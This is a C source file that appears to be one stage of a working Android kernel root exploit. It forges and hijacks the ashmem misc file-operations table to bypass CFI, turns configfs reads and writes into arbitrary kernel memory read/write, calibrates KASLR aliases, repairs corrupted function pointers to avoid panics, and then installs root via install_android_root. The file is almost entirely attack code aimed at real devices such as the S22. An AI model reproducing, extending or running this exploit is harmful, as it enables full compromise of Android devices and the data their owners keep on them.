#include "common.h"

#define PSELECT_CFI_ROUTE_ATTEMPTS 24

/*
 * The in-process pselect route (do_pselect_fake_lock_route, fd_set stamp,
 * burst consumer) was removed for s22: under TCG the consumer can fire
 * after do_select's return writeback clobbers the stale waiter, and the
 * chain walk then dereferences garbage (the QEMU panic at
 * ffffff8026fffab0).  The fops hijack now runs through the exp64 route —
 * see targets/s22/main.c (doreplacefops) and src/exp64/.
 */

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

/* .read is sprayed as 0 so the PI-chain walk's rb_next() stops at the fake
 * fops table instead of descending into kernel .text (see put_fake_fops_table).
 * Once ashmem_misc.fops == fake_fops, restore configfs_read_file through the
 * bin-write primitive (needs only the intact .write slot). */
int repair_fake_fops_read(int fd) {
  uint64_t cfg_read = text_addr(CONFIGFS_READ_ITER);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_READ_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &cfg_read, sizeof(cfg_read));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(cfg_read) &&
         rd == (ssize_t)sizeof(after) &&
         after == cfg_read;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  int boot_id_restored =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      slide_bootid_after == slide_bootid_want;

#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
  uintptr_t parent_type = SLIDE_LOGGERS_0_1 + slide_p0_offset +
                          sizeof(uint64_t);
  uint64_t type_before = 0;
  uint64_t type_after = 0;
  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
  ssize_t type_restore_ret =
      configfs_write_once(fd, parent_type, &type_want, sizeof(type_want));
  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
  pr_info("slide restore rb parent type pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), type_restore_ret,
          (unsigned long long)type_before,
          (unsigned long long)type_want,
          (unsigned long long)type_after, errno);
  return boot_id_restored &&
         type_restore_ret == (ssize_t)sizeof(type_want) &&
         type_after == type_want;
#else
  return boot_id_restored;
#endif
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t pre_fops = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  /* BVK1 diagnostic: also probe the slide-free alias */
  uintptr_t misc_fops_noslide = p0_data_alias(ASHMEM_MISC_FOPS);
  uint64_t pre_fops_ns = 0;
  ssize_t pre_rb_ns = configfs_read_once(
      fd, misc_fops_noslide, &pre_fops_ns, sizeof(pre_fops_ns));
  pr_info("cfi diag pid=%d fake=%016llx slide=%llx tgt=%016llx rd=%zd val=%016llx | noslide tgt=%016llx rd=%zd val=%016llx\n",
          getpid(), (unsigned long long)fake_fops,
          (unsigned long long)slide_p0_offset,
          (unsigned long long)misc_fops, (ssize_t)pre_rb,
          (unsigned long long)pre_fops,
          (unsigned long long)misc_fops_noslide, (ssize_t)pre_rb_ns,
          (unsigned long long)pre_fops_ns);
  /* Round-trip probe through our OWN captured page scratch area:
   * real ashmem has no .write/.write_iter, so a successful pwrite+
   * matching readback proves the forged fops table is live. */
  {
    uint64_t magic = (0x43465257ULL << 16) | (uint64_t)(getpid() & 0xffff);
    uintptr_t scratch = fake_fops + SCRATCH_OFF;
    ssize_t wrt = configfs_write_once(
        fd, scratch, &magic, sizeof(magic));
    uint64_t back = 0;
    ssize_t rdt = configfs_read_once(fd, scratch, &back, sizeof(back));
    pr_info("cfi roundtrip wr=%zd rd=%zd sent=%016llx got=%016llx ok=%d\n",
            (ssize_t)wrt, (ssize_t)rdt,
            (unsigned long long)magic, (unsigned long long)back,
            wrt == 8 && rdt == 8 && back == magic);
    /* Alias calibration: probe *misc_fops under 4 phys-load hypotheses */
    {
      static const uint64_t loads[4] = {
        0x80080000ULL, 0xa8000000ULL, 0x80080000ULL, 0xa8000000ULL
      };
      for (int i = 0; i < 4; i++) {
        uintptr_t cand =
          P0_PAGE_OFFSET |
          ((ASHMEM_MISC_FOPS - KIMAGE_TEXT_BASE) +
           (loads[i] - P0_PHYS_OFFSET)) +
          ((i >= 2) ? slide_p0_offset : 0);
        uint64_t v = 0;
        ssize_t r = configfs_read_once(fd, cand, &v, sizeof(v));
        pr_info("cfi alias load=%08llx slide=%d tgt=%016llx rd=%zd val=%016llx\n",
                (unsigned long long)loads[i], (i >= 2),
                (unsigned long long)cand, (ssize_t)r,
                (unsigned long long)v);
      }
    }
  }
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
               "read=%016llx want=%016zx errno=%d\n",
               pre_rb, misc_fops, (unsigned long long)pre_fops,
               fake_fops, errno);
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  /* exp64 rb-write collateral: fake_fops.llseek (+0x08, the "parent"
   * rb node's rb_right during the one-child erase) now holds the write
   * target address.  Repair it through the intact .write slot before any
   * VFS path can consume it. */
  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }

  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != original_fops) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!kaslr_done) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  if (cve_temp_root_mode()) {
    /* BVK1 temp-root: the pipe/physrw stage is the dominant panic source
     * and is only needed for KernelSU late-load.  Queue the umh root
     * directly through the CFI-stage configfs primitive. */
    pipe_stage_attempts = 1;
    reset_pipe_attempt();
    installed = install_android_root(fd);
  } else {
  for (int attempt = 0; attempt < 4; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
      sleep(2);
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
